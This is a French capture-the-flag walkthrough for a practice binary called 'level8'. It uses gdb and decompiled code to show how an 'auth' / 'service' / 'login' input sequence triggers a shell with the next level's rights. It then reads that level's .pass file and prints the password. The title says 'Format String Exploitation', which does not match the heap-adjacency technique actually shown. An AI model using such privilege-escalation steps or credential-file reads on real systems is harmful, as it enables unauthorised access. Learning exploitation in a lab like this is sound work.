
# Format String Exploitation

  

En décompilant le programme, on observe qu'il y a différents tests pour arriver à une condition finale. Si cette condition est respectée, alors un shell avec les droits de `level9` sera lancé.
```C
eax = auth;
eax = *((eax + 0x20));
if (eax != 0) {
	system ("/bin/sh");
	goto label_0;
}
```
Si on traduit le code décompilé pour avoir un code un plus clair, on peut supposer que cette condition semble être : 
```C
if (auth[32] != '\0') {
	system ("/bin/sh");`
}
```
En effet, `0x20` équivaut à 32 en base10.

Pour arriver jusqu'a cette condition, il vas nous falloir plusieurs étapes. 
La méthode la plus simple serait donc d'écrire `auth ` suivis de plus de 32 caractères afin que `auth[32]` soit différent de `\0`.

On va donc tester ça sur gdb.

```
> gdb level8
> (gdb) disas main
[...]
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    %eax,0x8049ab0
> (gdb) b *0x080486ab
> (gdb) r 
Starting program: /home/user/level8/level8
(nil), (nil)
auth sdfsd
0x804a008, (nil)
service

Breakpoint 2, 0x080486ab in main ()
> (gdb) x/s 0x804a008
0x804a008:	 "sdfsd\n"
```

Ici, nous avons break au niveau du `strdup`. Cette fonction est appelé lorsque l'on saisis `service` comme entré. Nous pouvons à cet endroit la afficher la valeur de `auth `, mais nous aurions pu le faire à d'autres endroits.

La valeur de `auth ` est ici `sdfsd\n`. Nous pouvons maintenant essayer de mettre plus de caractères afin de valider la condition `auth[32] != '\0'`.

```
> (gdb) b *0x080486ab
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, (nil)
service 

Breakpoint 2, 0x080486ab in main ()
> (gdb) x/s 0x804a008
0x804a008:	 ""
```
Malheureusement, `auth ` est maintenant égal  à `NULL`. Nous ne pourrons donc pas écrire suffisamment de caractères pour que `auth[32] != '\0'`.

Nous allons donc devoir trouver une autre solution pour arriver à notre condition finale. 
On peut observer que nos adresses `auth` et `service` sont très proche (désassembleur Cutter). 
```
auth:
0x08049aac add byte  [eax], al
0x08049aae add byte  [eax], al
service:
0x08049ab0 add byte  [eax], al
0x08049ab2 add byte  [eax], al
```

```
0x08049ab0 - 0x08049aac = 0x4
0x08049ab2 - 0x08049aae = 0x4
```
Nos adresse sont juste à coté. Donc :
```
auth[32] = service[28] 
```
Dans la partie de code qui correspond à `service`, on observe ce bout de code :
```C
_service = strdup(auStack137);
```
En regardant le `man` de `strdup`, on est tombé sur cela : 
```
The strdup() function allocates memory and copies into it the string addressed by _s1_, including the terminating null character
```
Cela signifie qu'un `\0` va être ajouté en bout de chaine. 
Il faut donc que l'on écrive plus de 28 caractères pour que `service[28] != '\0'`. 

Pour rentrer dans la dernière condition de check `if auth[32] != '\0'`, il faut que notre dernière `input`soit `login`.

On peut vérifier cela dans gdb.

```
> gdb level8
> (gdb) disass main
[...]
   0x080486ee <+394>:	movl   $0x8048833,(%esp)
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
   0x080486fa <+406>:	jmp    0x8048574 <main+16>
> (gdb) b *0x080486f5
Breakpoint 7 at 0x80486f5
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
logsdf
0x804a008, 0x804a018
```
Le programme ne `break` pas en mettant une entrée aléatoire.
On réessaye donc en  mettant `login` comme dernière entrée.

```
> (gdb) b *0x080486f5
Breakpoint 7 at 0x80486f5
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
Breakpoint 7, 0x080486f5 in main ()
```
Notre programme `break` bien, on peut donc maintenant lancer le programme.

```
> ./level8
[...]
> auth 
0x804a008, (nil)
> service AAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
> login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
``` 
